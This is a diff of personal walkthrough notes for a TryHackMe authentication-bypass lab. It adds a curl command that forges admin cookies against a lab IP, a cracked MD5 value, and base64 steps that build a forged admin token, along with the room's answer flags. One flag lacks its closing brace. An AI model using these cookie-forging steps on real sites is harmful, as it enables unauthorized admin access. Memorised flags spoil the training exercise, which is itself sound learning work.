@@ -101,6 +101,32 @@ What is the flag from Robert's support ticket?
 THM{AUTH_BYPASS_COMPLETE}
 
 
+Task 5 Cookie Tampering 
+What is the flag from changing the plain text cookie values?
+curl -H "Cookie: logged_in=true; admin=true" http://10.10.63.82/cookie-test 
+Logged In As An Admin - THM{COOKIE_TAMPERING}
+
+answer:THM{COOKIE_TAMPERING}
+
+What is the value of the md5 hash 3b2a1053e3270077456a79192070aa78 ?
+https://crackstation.net/
+463729
+
+
+
+- What is the base64 decoded value of VEhNe0JBU0U2NF9FTkNPRElOR30= ?
+hint: echo "VEhNe0JBU0U2NF9FTkNPRElOR30=" | base64 -d
+THM{BASE64_ENCODING
+
+
+
+- Encode the following value using base64 {"id":1,"admin":true}
+hint: echo '{"id":1,"admin":true}' | base64                                                                                                127 ⨯
+eyJpZCI6MSwiYWRtaW4iOnRydWV9Cg==
+
+
+
+
 http://10.10.63.82/customers/reset/d10d858a6524a39abe2a9996915a1e5b
 https://tryhackme.com/room/authenticationbypass
 https://www.hackingetico.org/authentication-bypass-habitaci%C3%B3n-de-tryhackme/
